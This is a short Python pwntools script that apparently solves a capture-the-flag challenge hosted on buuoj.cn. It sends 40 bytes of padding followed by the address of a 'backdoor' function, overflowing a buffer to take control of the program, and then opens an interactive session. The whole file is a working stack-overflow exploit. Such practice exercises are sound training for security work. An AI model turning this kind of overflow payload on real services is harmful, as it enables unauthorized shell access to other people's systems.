#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *


debug = 0
if debug:
    p = process('./pwn')
    context.terminal = ['tmux','splitw','-h']
    context.log_level='debug'
    gdb.attach(p)
else:
    p = remote('node5.buuoj.cn', 25776)
elf = ELF('./ret2libc')
rop = ROP('./ret2libc')


backdoor = 0x400708


payload = b'a' * 40 + p64(backdoor)
p.recvuntil(b'Welcome!May I have your name?\n')
p.sendline(payload)
p.recvuntil(b'Ok.See you!\n')
p.interactive()
